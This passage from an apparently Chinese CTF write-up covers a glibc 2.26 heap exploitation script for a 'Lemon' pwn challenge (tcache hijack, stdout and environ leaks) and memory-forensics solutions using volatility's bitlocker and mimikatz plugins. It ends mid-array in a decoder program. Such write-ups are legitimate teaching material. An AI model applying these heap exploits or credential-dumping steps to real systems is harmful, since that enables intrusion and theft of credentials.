&#39;)key&#x3D;u64(p.recv(8))l&#x3D;key^randlibcbase&#x3D;l-0x3ebca0add(9,0xf8,&#39;\n&#39;)delete(1)delete(2)delete(0)free&#x3D;libcbase+0x3ed8e8edit(9,p64(free))add(1,0xf8,&#39;\n&#39;)one&#x3D;libcbase+0x4f432system&#x3D;libcbase+0x04f550system&#x3D;one^randpayload&#x3D;p64(system)add(2,0xf8,payload+b&#39;\n&#39;)delete(1)p.interactive()</code></pre><h3 id="Lemon"><a href="#Lemon" class="headerlink" title="Lemon"></a>Lemon</h3><p>主要问题是2.26版本下, 未控制好指针导致任意写</p><p>数据结构如下:</p><p> lemon_name:</p><p>lemon_content:</p><p>主要可利用的函数是color:</p><p>这里的buf是指lemon_name结构, 所以可以控制指针lemon_addr的指向了, 因为只能用一次所以想控制整个tcache结构</p><p>其它一点可利用的函数:</p><p>开头的一次welcome:</p><p>虽然是有rand, 但无随机数种子, 所以是固定值, z3一把🔒!</p><p>eat函数: 可以打印chunkaddr第四字节, 用于配合后面分配堆块</p><p>整体思路: 利用color控制lemon_addr指向tcache的地址, 然后用一次释放一次可以做到一直控制tcache, 第一次使用可以设置tcache某些块数量达到7, 从而生成unsortedbin, 虽然无法直接打印, 但是使用particular write+爆破可以让chunk申请到_IO_2_1_stdout中, 然后泄露libc, 之后再以类似操作用environ打印出栈基址, 配合之前的泄露获取stack地址, 最后再用io即可打印出flag</p><p>难点:</p><p>多了个类似ptmalloc的检测在分配完成之后, 导致使用free_hook等充满难度:</p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./lemon_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token operator">=</span>BitVec<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>x<span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">-</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">0x6b8b4567</span><span class="token operator">==</span><span class="token number">0x13b6db38</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> result<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span>length<span class="token punctuation">,</span>context<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name your lemon: \n'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length of message for you lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> length <span class="token operator">&lt;=</span> <span class="token number">0x400</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'message: \n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">color</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon  : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'draw and color!\n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span>       <span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'me?\n'</span><span class="token punctuation">,</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' number: \n'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x4a46bd98</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'first: \n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>            add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token comment">#add(3,'a\n',944,'a\n')</span>    <span class="token comment">#add(3,'a\n',16,'a\n')</span>    eat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'eat eat eat '</span><span class="token punctuation">)</span>    addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">-</span><span class="token number">0x250</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">''' control all tc'''</span>    throw<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x37</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x86ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''boom!'''</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x88'</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    stdin<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> stdin<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>    stdout <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    environ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io, '''b *$rebase(0x1106)''')</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    stack<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x180</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment">#io=process('./lemon_pwn')</span>    <span class="token comment">#io = remote('47.104.70.90',34524)</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">except</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h3><p>volatility 内存取证，使用 bitlocker 插件可得如下内容。</p><pre class="language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6.1Address : 0xfa800d12e7e0Cipher  : AES-128FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ceTWEAK   : b423bd84872ff72b583bb9bdee1762ac</code></pre><p>使用 bdemount 可解密 bitlocker 磁盘分区，然后使用 mount 挂载，可以得到一个2.pcapng。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> bdemount -k 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/mount1</code></pre><p>使用 mimikatz 插件可以得到下列内容。</p><pre class="language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6.1Module   User             Domain           Password-------- ---------------- ---------------- ----------------------------------------wdigest  XiaoMing         PC               xiaoming_handsomewdigest  PC$              WORKGROUP</code></pre><p>使用 FTK Imager 加载磁盘后在 XiaoMing 用户的桌面发现了 flag.txt 提示需要仿真。使用 VMware 加载 FTK Imager 挂载的物理磁盘新建虚拟机，使用 Oracle Virtual Box 启动虚拟机来仿真。</p><img src="/article/2021xyb/c09803d05f1e71c6e555bb1190c5fc8.jpg" class="" title="c09803d05f1e71c6e555bb1190c5fc8" loading="lazy"><p>对流量包使用 WireShark 分析，UDP 流 32 处有压缩包。</p><img src="/article/2021xyb/image-0655563.png" class="" title="image" loading="lazy"><p>将其提取出来后在注释中可发现提示，其解压密码与电脑登录密码一致。解压后得到 Word 文档，使用上述便签上的密码解密即可得到 flag。</p><h3 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h3><p>本题我们拿了一血，可惜<small>啧啧 发生了一些事情</small></p><p>使用 volatility 对内存镜像进行分析，在用户的桌面可以发现一个可疑的 exe 文件，将其提取出来。使用如下脚本解出来 data。</p><pre class="language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;  FILE *v4; &#x2F;&#x2F; [esp+10h] [ebp-14h]  int k; &#x2F;&#x2F; [esp+14h] [ebp-10h]  signed int j; &#x2F;&#x2F; [esp+18h] [ebp-Ch]  int i; &#x2F;&#x2F; [esp+1Ch] [ebp-8h]  char *key &#x3D; &quot;this_a_key&quot;;  unsigned char data[] &#x3D;&#123;  164, 167, 120, 147, 254, 208,  69, 138, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  97,  97,  92, 107, 155, 134,   125, 104, 111, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 110, 121,   116, 104, 105, 115,  95,  97,  95, 123, 101, 121,   122, 104, 105, 115,  94,  97,  95, 107, 155, 134,   139, 151, 105, 115,  95,  97,  83, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151,  59, 115,  48,  97,  48, 107,  17, 121,    84, 104,  44, 115,  49,  97,  43, 107,  23, 121,    13, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  73, 107,  96, 121,   139, 151, 150, 140, 160, 158, 160, 148, 102, 121,   116, 104, 105, 122,  93,  97,  95, 107, 101, 121,   180, 104, 105, 115,  95,  97,  95,  45, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   132, 132,  14, 203, 176,  27, 136, 106,  96, 121,   116, 104, 233, 127,  95,  97,  95, 107, 101, 121,   117, 104,  42, 115,  48,  97,  50, 107,  21, 121,    59, 104,  11, 115,  53,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  77,  97,  93, 106, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    26, 104, 105, 115,  95,  97,  95, 107,  50, 121,    27, 104,  27, 115,  59,  97,  27, 107,  10, 121,    23, 104,  28, 115,  50,  97,  58, 107,  11, 121,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 115, 115,  93,  96, 160, 148, 154, 134,   112, 104, 105, 115, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107,  55, 115,   116, 104, 105, 115,  95,  97,  16, 107,   7, 121,    30, 104,  12, 115,  60,  97,  43, 107,  53, 121,    27, 104,   6, 115,  51,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    98, 104, 104, 114,  94,  97,  95, 107, 103, 121,   116, 104, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 127, 171, 175, 213,   155,  18, 190, 114, 127, 161, 149, 199, 138,   3,   163, 105, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107, 152, 134,   139, 151, 151, 140, 160, 158, 161, 148, 154, 134,   115, 104, 105, 115,  89,  97,  95, 107,  97, 121,   116, 104,  97, 115,  95,  97,  86, 107, 101, 121,   126, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  90, 107,  54, 121,     1, 104,   4, 115,  50,  97,  62, 107,  23, 121,    13, 104,  32, 115,  49,  97,  57, 107,  10, 121,     6, 104,   